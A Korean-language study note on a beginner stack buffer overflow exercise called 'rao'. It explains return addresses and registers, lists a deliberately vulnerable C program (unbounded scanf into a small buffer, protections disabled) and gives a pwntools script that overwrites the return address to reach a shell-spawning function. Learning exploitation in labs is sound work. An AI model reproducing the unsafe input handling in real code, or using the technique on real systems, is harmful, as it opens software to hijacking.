
어떤 함수가 존재할 때

- 반환 주소값(return address) 의 위치는 항상 rbp + 8이다.
- rbp는 어떤 함수의 기준점을 의미한다.

함수의 첫번째인자 rdi, 두번째 인자 rsi, 리턴값 rax
```
// Name: rao.c
// Compile: gcc -o rao rao.c -fno-stack-protector -no-pie

#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

void get_shell() {
  char *cmd = "/bin/sh";
  char *args[] = {cmd, NULL};

  execve(cmd, args, NULL);
}

int main() {
  char buf[0x28];

  init();

  printf("Input: ");
  scanf("%s", buf);

  return 0;
}
```
해당 문제의 실행파일을 실행하려 하면 권한이 없어 실행되지 않음, ls -l로 권한을 확인 가능.

rsp, 0x30 메모리를 30만큼 할당









이후 ex.py를 만들어 pwntools로 코드를 작성한다.
<br>우선
```
from pwn import *

r = process("./rao")

r.interactive()
```

get_shell 함수의 주소는 0x00000000004006aa, 이를 리틀 엔디언으로 변환하면 \xaa\x06\x40\x00\x00\x00\x00\x00.<br>xaa는 아스키코드 값 밖이라 키보드로 입력이 불가하기에 pwntools을 사용하여 넣는 것.
```
from pwn import *

r = process("./rao")

r.sendlineafter(b"Input: ", b"A" * 56 + b"\xaa\x06\x40\x00\x00\x00\x00\x00")

r.interactive()
```
이를 실행해보면 input이 뜨지 않고, 명령이 실행 가능하게 된다. <br> 즉, 쉘을 따는 것이 성공한 것이 된다.<br>
